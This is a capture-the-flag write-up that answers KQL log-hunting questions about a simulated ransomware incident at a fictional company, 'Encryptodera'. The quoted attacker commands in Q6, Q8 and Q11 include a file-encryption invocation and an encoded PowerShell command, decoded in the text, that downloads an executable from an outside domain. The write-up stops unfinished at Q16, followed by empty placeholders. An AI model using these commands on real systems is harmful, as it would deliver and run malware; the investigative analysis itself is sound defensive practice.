## Inside Encryptodera: An Insider Threat Scenario: 0: KQL 101<br>
### **Summary**<br>
Some employees have said that they can't use their computers. One employee mentioned that they saw this suspicious file show up on their system.
<br><br>

**Q1. What is the filename of this note?**<br><br>
From the image on website, the filename can be seen.<br><br>

**Answer: YOU_GOT_CRYTOED_SO_GIMME_CRYPTO.txt**<br><br>

**Q2. What kind of attack is this?**<br><br>

**Answer: Ransomware**<br><br>

**Q3.On how many machines was this .txt file seen?**<br><br>

```
FileCreationEvents
| where path contains "YOU_GOT_CRYTOED_SO_GIMME_CRYPTO.txt"
| distinct hostname
```
<br>

**Answer: 306**<br><br>

**Q4. What time was the ransom note first seen?**<br><br>

```
FileCreationEvents
| where path contains "YOU_GOT_CRYTOED_SO_GIMME_CRYPTO.txt"
| order by timestamp asc
```
<br>

**Answer: 2/17/2024, 2:34:54 AM**<br><br>

**Q5. What is the hostname of the system where the ransom note was first seen?**<br><br>
From previous query.<br><br>

**Answer: UL8R-MACHINE**<br><br>

**Q6. How many files were encrypted on this machine?**<br><br>
Start by looking for command to encrypt files.<br>

```
ProcessEvents
| where hostname == "UL8R-MACHINE"
| where process_commandline contains "encrypt"
```
<br>
Result:<br><br>

```
start /b C:\\ProgramData\\files_go_byebye.exe -encrypt -target C:\\Users\\ -ext .umadbro
```
<br>
See that files encrpted were given the extension .umadbro.<br><br>

```
FileCreationEvents
| where hostname == "UL8R-MACHINE"
| where filename contains "umadbro"
| count
```
<br>

**Answer: 50**<br><br>

**Q7. What is the extension that was used on the encrypted files?**<br><br>
From previous question.<br><br>

**Answer: umadbro**<br><br>

**Q8. What command was run that references the ransomware extension?**<br><br>
From question 6.<br><br>

**Answer: start /b C:\\ProgramData\\files_go_byebye.exe -encrypt -target C:\\Users\\ -ext .umadbro**<br><br>

**Q9. When did files_go_byebye.exe appear on this machine?**<br><br>

```
FileCreationEvents
| where hostname == "UL8R-MACHINE"
| where path contains "files_go_byebye.exe"
```
<br>

**Answer: 2/17/2024, 2:30:50 AM**<br><br>

**Q10. How many commands were run on UL8R-MACHINE during this timeframe?**<br><br>

```
ProcessEvents
| where hostname == "UL8R-MACHINE"
| where timestamp between (datetime("2024-02-16") .. datetime("2024-02-18"))
```
<br>

**Answer: 23**<br><br>

**Q11. There's a base64 encoded powershell command run in this time window. What domain does the encoded PowerShell reference?**<br><br>
From the previous query, there is a result at 2/17/2024, 2:29:53 AM that contains Base64 string.<br>

```
C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc cG93ZXJzaGVsbCAtYyAiSW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vbm90aWZpY2F0aW9uLWZpbmFuY2Utc2VydmljZXMuY29tL2ZpbGVzX2dvX2J5ZWJ5ZS5leGUgLU91dEZpbGUgQzpcXFByb2dyYW1EYXRhXFxmaWxlc19nb19ieWVieWUuZXhlIg==
```
<br>
Pass the string after '-enc' into Cyberchef and select From Base64. The output is:<br><br>

```
powershell -c "Invoke-WebRequest -Uri http://notification-finance-services.com/files_go_byebye.exe -OutFile C:\\ProgramData\\files_go_byebye.exe"
```
<br>

**Answer: notification-finance-services.com**<br><br>

**Q12. What command is run right before the base64-encoded PowerShell?**<br><br>
From query in question 10.<br><br>

**Answer: gpupdate /force**<br><br>

**Q13. How many devices ran the gpupdate /force command?**<br><br>

```
ProcessEvents
| where process_commandline contains "gpupdate /force"
```
<br>

**Answer: 306**<br><br>

**Q14. How many machines at Encryptodera ran "systeminfo"?**<br><br>

```
ProcessEvents
| where process_commandline contains "systeminfo"
```
<br>

**Answer: 8**<br><br>

**Q15. What was the timestamp for the first time the command was run?**<br><br>
From the previous query.<br><br>

**Answer: 2/2/2024, 3:32:36 AM**<br><br>

**Q.16 How many days elapsed between when the attackers ran discovery commands and when the ransomware attack started?**<br><br>
**Answer: **<br><br>


**Q. **<br><br>
**Answer: **<br><br>
**Q. **<br><br>
**Answer: **<br><br>
**Q. **<br><br>
**Answer: **<br><br>
**Q. **<br><br>
**Answer: **<br><br>
**Q. **<br><br>
**Answer: **<br><br>
**Q. **<br><br>
**Answer: **<br><br>
**Q. **<br><br>
**Answer: **<br><br>
**Q. **<br><br>
**Answer: **<br><br>
**Q. **<br><br>
**Answer: **<br><br>
**Q. **<br><br>
**Answer: **<br><br>
**Q. **<br><br>
**Answer: **<br><br>
**Q. **<br><br>
**Answer: **<br><br>
**Q. **<br><br>
**Answer: **<br><br>
**Q. **<br><br>
**Answer: **<br><br>
**Q. **<br><br>
**Answer: **<br><br>

